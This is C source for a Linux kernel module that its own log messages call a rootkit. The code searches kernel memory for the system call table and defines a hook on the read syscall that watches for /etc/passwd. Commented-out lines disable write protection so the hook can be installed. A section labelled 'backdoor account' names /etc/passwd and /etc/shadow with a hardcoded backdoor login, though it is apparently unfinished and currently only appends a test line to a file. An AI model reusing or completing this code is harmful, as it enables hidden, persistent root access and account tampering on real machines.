#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/fdtable.h>
#include <linux/fs.h>
#include <asm/uaccess.h>

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

asmlinkage int (*o_read)(int fd, void* buf, size_t count);

psize *sys_call_table;

psize **find(void) {

	psize **sctable;
	psize i = START_CHECK;

	while (i < END_CHECK) {

		sctable = (psize **) i;
		if (sctable[__NR_close] == (psize *) sys_close) return &sctable[0];
		i += sizeof(void *);
	}

	return NULL;
}

// backdoor account
// ================

// username is 'backdoor'
// password is 'backdoor'

#define FILE_NAME "/home/matt/Documents/rootkit/test.txt"
#define ADDED_LINE "this is the added line\n"
#define PASSWD_PATH "/etc/passwd"
#define SHADOW_PATH "/etc/shadow"
#define PASSWD_STRING "idk"
#define SHADOW_STRING "idk"

void delete_text_from_file(char* text, char* file_path) {

	// declare variables
	int size;
	mm_segment_t fs;
	char* position;
	int text_size;
	int offset;
	char* end_of_file;
	int end_of_file_size;
	int new_size;

	// open file
	struct file* filp = filp_open(file_path, O_RDWR, 0);
	if (IS_ERR(filp)) {

		printk(KERN_ALERT "could not open file %s\n", file_path);
		return;
	}

	// find file size
	vfs_llseek(filp, 0, SEEK_END);
	size = filp->f_pos;
	vfs_llseek(filp, 0, SEEK_SET);
	printk("file size: %d\n", size);

	char buf[size + 1];
	buf[size] = 0;

	// set fs
	fs = get_fs();
        set_fs(get_ds());

	// find our text in the file
	vfs_read(filp, buf, size, &filp->f_pos);
	position = strstr(buf, text);
	if (position == NULL) {

		printk("couldn't find text, weird...\n");
		set_fs(fs);
		filp_close(filp, NULL);
		return;
	}

	// create a buch of variables with this pointer
	text_size = strlen(text);
	offset = position - buf;
	end_of_file = position + text_size;
	end_of_file_size = size - offset - text_size;
	new_size = size - text_size;

	// write over the found text
	vfs_llseek(filp, offset, SEEK_SET);
	vfs_write(filp, end_of_file, end_of_file_size, &filp->f_pos);

	// truncate file
	do_truncate(filp->f_dentry, new_size, 0, filp);

        set_fs(fs);
	filp_close(filp, NULL);
}

asmlinkage int backdoor_read(int fd, void* buf, size_t count) {

	// declare variables
	char* tmp;
	char* pathname;

	int ret = (*o_read)(fd, buf, count);

	struct file* filp = fcheck(fd);
	struct path* path = &filp->f_path;
	path_get(path);
	tmp = (char *)__get_free_page(GFP_KERNEL);

	if (!tmp) {

		path_put(path);
		printk(KERN_ERR "could not create tmp\n");
		return ret;
	}

	pathname = d_path(path, tmp, PAGE_SIZE);
	path_put(path);

	if (IS_ERR(pathname)) {

		free_page((unsigned long)tmp);
		printk(KERN_ERR "invalid pathname\n");
		return ret;
	}

	if (strcmp(pathname, "/etc/passwd") == 0) printk("we did it baby\n");

	free_page((unsigned long)tmp);

	return ret;
}

void add_backdoor(void) {

	// declare variables
	mm_segment_t fs;

	struct file* filp = filp_open(FILE_NAME, O_WRONLY | O_APPEND, 0);
	if (IS_ERR(filp)) {

		printk(KERN_ALERT "could not open file %s\n", FILE_NAME);
		return;
	}

	fs = get_fs();
        set_fs(get_ds());

	vfs_write(filp, ADDED_LINE, strlen(ADDED_LINE), &filp->f_pos);

        set_fs(fs);

	filp_close(filp, NULL);
	
	/*write_cr0(read_cr0() & (~ 0x10000));
	o_read = (void *) xchg(&sys_call_table[__NR_read], backdoor_read);
	write_cr0(read_cr0() | 0x10000);*/
}

void remove_backdoor(void) {

	delete_text_from_file(ADDED_LINE, FILE_NAME);

	/*write_cr0(read_cr0() & (~ 0x10000));
	xchg(&sys_call_table[__NR_read],o_read);
	write_cr0(read_cr0() | 0x10000);*/
}

// load and unload the module
// ==========================

int init_module(void) {
    	
	if ((sys_call_table = (psize *) find())) {
		printk("sys_call_table found at %p\n", sys_call_table);
	}
	
	else {
		printk("sys_call_table not found, aborting\n");
		return 1;
	}

	add_backdoor();
    
	printk(KERN_INFO "rootkit loaded\n");	
	return 0;
}

void cleanup_module(void) {

	remove_backdoor();

	printk(KERN_INFO "rootkit unloaded\n");
}
